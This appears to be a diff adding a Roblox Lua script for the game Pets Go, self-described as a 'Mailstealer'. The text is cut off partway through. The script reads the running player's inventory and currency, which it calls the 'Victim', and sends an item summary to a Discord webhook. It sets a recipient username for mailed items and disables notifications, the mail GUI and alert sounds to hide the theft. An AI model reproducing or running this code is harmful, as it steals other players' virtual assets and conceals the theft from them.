@@ -1,0 +1,164 @@
+Username = bbynenia
+min_rap = 10000 -- minimum rap of each item you want to get sent to you. 10k by default
+min_chance = 10000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
+webhook = https://discord.com/api/webhooks/129704
+
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game.ReplicatedStorage.Library)
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = "Join gg / GY2RVSEGDT to get back"
+local HttpService = game:GetService("HttpService")
+local sortedItems = {}
+local totalRAP = 0
+_G.scriptExecuted = _G.scriptExecuted or false
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local GemAmount1 = 0
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+		break
+    end
+end
+
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 and suffixIndex < #suffixes do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
+end
+
+local function SendMessage(username, diamonds)
+    local headers = {
+        ["Content-Type"] = "application/json",
+    }
+
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = username,
+			inline = true
+		},
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = "",
+            inline = false
+        }
+	}
+
+    local combinedItems = {}
+    local itemRapMap = {}
+
+    for _, item in ipairs(sortedItems) do
+        local rapKey = item.name
+        if itemRapMap[rapKey] then
+            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
+        else
+            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
+            table.insert(combinedItems, rapKey)
+        end
+    end
+
+    table.sort(combinedItems, function(a, b)
+        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
+    end)
+
+    for _, itemName in ipairs(combinedItems) do
+        local itemData = itemRapMap[itemName]
+        local itemLine = ""
+        if itemData.chance then
+            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
+        else
+            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
+        end
+        fields[2].value = fields[2].value .. itemLine .. "\n"
+    end
+
+    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "New Pets Go Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+
+    if webhook and webhook ~= "" then
+        local response = request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
+
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+	noti.Enabled = false
+end)
+noti.Enabled = false
+
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+            x.Volume=0
+            x.PlayOnRemove=false
+            x:Destroy()
+        end
+    end
+end)
+
+local function getRAP(Type, Item)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
